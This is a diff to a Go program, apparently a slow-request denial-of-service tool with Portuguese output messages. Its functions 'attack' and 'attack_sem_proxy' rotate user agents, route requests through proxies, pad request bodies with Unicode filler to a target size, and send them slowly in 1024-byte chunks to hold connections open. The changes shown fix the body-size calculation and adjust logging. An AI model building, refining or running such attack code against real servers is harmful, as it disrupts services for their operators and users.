@@ -31,12 +31,55 @@ var (
         "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
     }
 )
+// Function to calculate the size of the body required for each parameter
+func calculateParamSize(totalSize int, params []string) int {
+	// Calculate the size for each parameter
+	// Example: Total size of 127 KB, if there are 2 parameters, each should be about (127 KB - length of separators) / number of parameters
+	// Adjust for URL encoding and key lengths
+
+	numParams := len(params)
+	if numParams == 0 {
+		return 0
+	}
+    var actualSize int
+    var paramsToFill int
+    actualSize = 0
+    paramsToFill = 0
+	for _, pair := range params {
+		parts := strings.SplitN(pair, "=", 2)
+		if len(parts) != 2 {
+			continue
+		}
+		key, value := parts[0], parts[1]
+		if value == "AUTO" {
+			paramsToFill = paramsToFill + 1
+		}else{
+            actualSize = actualSize + len(value) + len(key)
+        }
+	}
+    return (totalSize - actualSize - (numParams * 1)) / paramsToFill; // 1 byte for each '&' or '&' for each key-value pair
+}
+
+// Function to generate a Unicode string of a specific size (in bytes)
+func generateUnicodeString(sizeBytes int) string {
+	var builder strings.Builder
+	unicodeChar := "你好مرحباこんにちは你" // You can replace this with other Unicode characters
+	for builder.Len() < sizeBytes {
+		builder.WriteString(unicodeChar)
+	}
+	return builder.String()[:sizeBytes] // Ensure we only return the exact number of bytes
+}
 
 // Function to parse parameters and replace `AUTO` with a Unicode string
 func parseParams(paramStr string, bodySize int) map[string]string {
 	params := make(map[string]string)
 	paramPairs := strings.Split(paramStr, "&")
-	paramSize := calculateParamSize(bodySize, params)
+	paramSize := calculateParamSize(bodySize, paramPairs)
+    if paramSize < 0 {
+        fmt.Println("Os parametros são maiores que o maximo de corpo.")
+        os.Exit(1)
+    }
+
 	for _, pair := range paramPairs {
 		parts := strings.SplitN(pair, "=", 2)
 		if len(parts) != 2 {
@@ -100,29 +143,6 @@ func parseDuration(durationStr string) time.Duration {
     return d
 }
 
-// Function to generate a Unicode string of a specific size (in bytes)
-func generateUnicodeString(sizeBytes int) string {
-	var builder strings.Builder
-	unicodeChar := "你好مرحباこんにちは你" // You can replace this with other Unicode characters
-	for builder.Len() < sizeBytes {
-		builder.WriteString(unicodeChar)
-	}
-	return builder.String()[:sizeBytes] // Ensure we only return the exact number of bytes
-}
-
-// Function to calculate the size of the body required for each parameter
-func calculateParamSize(totalSize int, params map[string]string) int {
-	// Calculate the size for each parameter
-	// Example: Total size of 127 KB, if there are 2 parameters, each should be about (127 KB - length of separators) / number of parameters
-	// Adjust for URL encoding and key lengths
-	numParams := len(params)
-	if numParams == 0 {
-		return 0
-	}
-	return (totalSize - (numParams * 1)) / numParams // 1 byte for each '&' or '&' for each key-value pair
-}
-
-
 func attack(ctx context.Context, proxyURL string, stopChan <-chan struct{}) {
     select {
         case <-ctx.Done():
@@ -180,7 +200,10 @@ func attack(ctx context.Context, proxyURL string, stopChan <-chan struct{}) {
             defer resp.Body.Close()
 
             fmt.Println("Conexão aberta através do proxy status:", resp.Status)
-			fmt.Println("Tamanho Corpo:", len(body))
+			sizeInBytes := len(body)
+            sizeInKB := float64(sizeInBytes) / 1024
+
+            fmt.Printf("Tamanho do corpo em KB: %.2f KB\n", sizeInKB)
             // Envia cabeçalhos adicionais para manter a conexão ativa
             for i := 0; i < len(body); i += 1024 {
                 select {
@@ -254,7 +277,10 @@ func attack_sem_proxy(ctx  context.Context, stopChan <-chan struct{}) {
             defer resp.Body.Close()
 
             fmt.Println("Conexão aberta:", resp.Status)
-			fmt.Println("Tamanho Corpo:", len(body))
+            sizeInBytes := len(body)
+            sizeInKB := float64(sizeInBytes) / 1024
+
+            fmt.Printf("Tamanho do corpo em KB: %.2f KB\n", sizeInKB)
             // Envia cabeçalhos adicionais para manter a conexão ativa
             for i := 0; i < len(body); i += 1024 {
                 select {
